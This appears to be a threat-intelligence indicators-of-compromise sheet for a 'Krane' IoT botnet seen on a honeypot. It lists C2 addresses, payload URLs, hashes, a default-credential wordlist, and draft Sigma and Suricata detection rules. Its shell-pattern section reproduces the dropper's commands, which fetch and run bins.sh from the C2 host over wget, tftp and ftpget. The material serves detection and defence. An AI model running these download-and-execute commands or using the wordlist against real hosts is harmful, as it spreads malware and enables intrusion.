---
date: 2026-04-20
campaign: krane-botnet
type: iocs
tags:
  - ioc
  - threat/botnet
  - threat/brute-force
---

# Krane Botnet — Indicators of Compromise

Reference: `krane-botnet-campaign.md`

---

## Network Indicators

### IP Addresses

| IP               | Role              | Notes                              |
|------------------|-------------------|------------------------------------|
| `89.190.156.19`  | C2 / payload host | Serves bins.sh and all binaries    |
| `89.190.156.34`  | Attack source     | Performed the honeypot compromise  |

### Domains

| Domain                                | Type        | Notes                                            |
|---------------------------------------|-------------|--------------------------------------------------|
| `minecraftpixelger39clone.dedyn.io`   | C2 / module | Go module import path embedded in binary; dedyn.io dynamic DNS |

### URLs

```
http://89.190.156.19/bins.sh
http://89.190.156.19/krane_armv5
http://89.190.156.19/krane_armv6
http://89.190.156.19/krane_armv7
http://89.190.156.19/krane_mips
http://89.190.156.19/krane_mipsle
http://89.190.156.19/krane_linux_x64
http://89.190.156.19/bins/hoho.arm
http://89.190.156.19/bins/hoho.arm5
http://89.190.156.19/bins/hoho.arm6
http://89.190.156.19/bins/hoho.arm7
http://89.190.156.19/bins/hoho.m68k
http://89.190.156.19/bins/hoho.mips
http://89.190.156.19/bins/hoho.mpsl
http://89.190.156.19/bins/hoho.ppc
http://89.190.156.19/bins/hoho.sh4
http://89.190.156.19/bins/hoho.spc
http://89.190.156.19/bins/hoho.x86
```

---

## File Hashes (captured)

| File          | SHA256                                                             | Size   |
|---------------|--------------------------------------------------------------------|--------|
| bins.sh       | `c0d96546c15948ac504193f1d3bc9adbdacb129dca30e56b93936d88ef658f35` | 2.3 KB |
| krane_armv5   | `1bfcaf5444e67da8630d8f7077167268be09c47a9aa4e976e1d87979fd64cd42` | 6.1 MB |
| krane_armv6   | `6117f3f72eeacb24536a468c6a6f6d878987dfd88941b9622fc35b25e92581b5` | 6.1 MB |
| krane_armv7   | `3ef2c9262b73a3a8a808ce0d083d83c112ab07ef39a1371d3efea1acbfe83b2c` | 6.1 MB |
| krane_mips    | `a4375c0a35f692ba19eb35a14d970aff83a285d46dd4ca2744fa9fc1dc2fbf2a` | 6.9 MB |

Local copies: `/home/cowrie/cowrie/var/lib/cowrie/downloads/<sha256>`

---

## Behavioural Indicators

### Shell Patterns

```bash
# Dropper fingerprint
ulimit -n 99999
wget http://89.190.156.19/bins.sh
chmod 777 bins.sh
sh bins.sh

# Execution + self-delete pattern
chmod +x krane_*; ulimit -n 99999; ./krane_*; rm -rf krane_*

# Multi-protocol fallback (delivery on stripped IoT devices)
tftp 89.190.156.19 -c get tftp1.sh
ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh
```

### Network Patterns

```
# Self-IP discovery (appears on first run)
GET https://api.ipify.org?format=text

# High-rate SYN to port 22 across random /8 ranges
# (skips RFC1918: 10/8, 172.16/12, 192.168/16)
```

### Process Indicators

- Process named `krane_armv5` / `krane_armv6` / `krane_armv7` / `krane_mips` launched from `/tmp` or `/var/run`
- Process self-deletes its executable after launch
- Unusually high open file descriptor count (`ulimit` set to 99999)
- High outbound TCP SYN rate to port 22

---

## Credentials Observed / Embedded

| Credential Type | Values |
|----------------|--------|
| Attack entry password | `050602` |
| Embedded wordlist fragments | `admin`, `root`, `user`, `pi`, `test`, `support`, `default`, `enable`, `system`, `ntp`, `123456`, `12345`, `888888`, `password`, `alpine` |

---

## Sigma Rule (draft)

```yaml
title: Krane Botnet Dropper Activity
status: experimental
description: Detects krane botnet dropper execution pattern on Linux systems
logsource:
  category: process_creation
  product: linux
detection:
  selection_ulimit:
    CommandLine|contains: 'ulimit -n 99999'
  selection_wget_c2:
    CommandLine|contains:
      - '89.190.156.19'
      - 'minecraftpixelger39clone.dedyn.io'
  selection_binary_names:
    CommandLine|contains:
      - 'krane_arm'
      - 'krane_mips'
      - 'krane_linux'
      - 'hoho.arm'
      - 'hoho.mips'
  condition: 1 of selection_*
falsepositives:
  - None expected
level: high
tags:
  - attack.execution
  - attack.t1059.004
  - attack.lateral_movement
  - attack.t1110.001
```

---

## Suricata Rules (draft)

```
# C2 connection
alert tcp $HOME_NET any -> 89.190.156.19 any (msg:"Krane Botnet C2 Connection"; sid:9000001; rev:1;)

# bins.sh download
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Krane Botnet bins.sh Download"; flow:established,to_server; http.uri; content:"/bins.sh"; sid:9000002; rev:1;)

# krane binary download
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Krane Botnet Binary Download"; flow:established,to_server; http.uri; content:"/krane_"; sid:9000003; rev:1;)

# hoho binary download
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Krane Botnet hoho Binary Download"; flow:established,to_server; http.uri; content:"/bins/hoho."; sid:9000004; rev:1;)

# Self-IP lookup (bot fingerprint)
alert dns $HOME_NET any -> any 53 (msg:"Krane Bot Self-IP Lookup"; dns.query; content:"api.ipify.org"; sid:9000005; rev:1;)
```
